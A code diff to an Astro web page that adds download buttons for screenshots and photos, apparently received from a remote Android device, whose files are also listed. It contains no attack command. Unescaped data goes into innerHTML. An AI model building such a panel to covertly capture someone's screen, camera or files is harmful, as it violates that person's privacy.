@@ -524,9 +524,11 @@ import Layout from '../layouts/Layout.astro';
       
       area.innerHTML = '';
       if (data.screenshot_base64) {
-        area.innerHTML = `<img src="data:image/jpeg;base64,${data.screenshot_base64}" alt="Screenshot" />`;
+        const src = `data:image/jpeg;base64,${data.screenshot_base64}`;
+        area.innerHTML = `<div style="text-align: center;"><img src="${src}" alt="Screenshot" style="max-width: 100%; border-radius: 8px; margin-bottom: 12px; border: 1px solid var(--cyber-cyan-dim);" /><br/><a href="${src}" download="screenshot_${Date.now()}.jpg" style="background: rgba(0, 240, 255, 0.1); border: 1px solid var(--cyber-cyan); color: var(--cyber-cyan); padding: 10px 20px; border-radius: 6px; cursor: pointer; font-family: var(--font-mono); font-weight: bold; text-decoration: none; display: inline-block;">[ DOWNLOAD SCREENSHOT ]</a></div>`;
       } else if (data.photo_base64) {
-        area.innerHTML = `<img src="data:image/jpeg;base64,${data.photo_base64}" alt="Photo" />`;
+        const src = `data:image/jpeg;base64,${data.photo_base64}`;
+        area.innerHTML = `<div style="text-align: center;"><img src="${src}" alt="Photo" style="max-width: 100%; border-radius: 8px; margin-bottom: 12px; border: 1px solid var(--cyber-cyan-dim);" /><br/><a href="${src}" download="photo_${Date.now()}.jpg" style="background: rgba(0, 240, 255, 0.1); border: 1px solid var(--cyber-cyan); color: var(--cyber-cyan); padding: 10px 20px; border-radius: 6px; cursor: pointer; font-family: var(--font-mono); font-weight: bold; text-decoration: none; display: inline-block;">[ DOWNLOAD PHOTO ]</a></div>`;
       } else if (data.files) {
         let html = `<h4 style="margin-bottom: 12px; font-family: var(--font-mono); color: var(--cyber-cyan);">Directory Listing: ${data.path}</h4><ul style="list-style: none; padding: 0; margin: 0;">`;
         if (data.path && data.path !== '/' && data.path !== '/storage/emulated/0') {
